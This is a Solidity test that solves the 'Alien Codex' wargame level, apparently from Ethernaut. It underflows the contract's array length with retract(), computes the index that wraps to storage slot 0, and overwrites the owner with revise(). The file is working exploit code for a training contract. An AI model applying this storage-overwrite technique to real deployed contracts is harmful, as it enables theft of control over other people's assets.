// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./AlienCodexFactory.sol";

contract AlienCodexTest {
    AlienCodexFactory factory;

    function setUp() public {
        factory = new AlienCodexFactory();
    }

    function cala() public pure returns (uint256) {
        bytes32 index = keccak256(abi.encode(1));
        uint256 L = 0;
        return (L - 1) - uint256(index) + 1;
    }

    function testAlienCodex() public {
        address _alienCodex = factory.createInstance(address(this));

        address payable alienCodex = address(uint160(_alienCodex));

        AlienCodex(alienCodex).make_contact();

        AlienCodex(alienCodex).retract();

        AlienCodex(alienCodex).revise(cala(), bytes32(uint256(uint160(address(this)))));

        factory.validateInstance(alienCodex, address(this));
    }
}
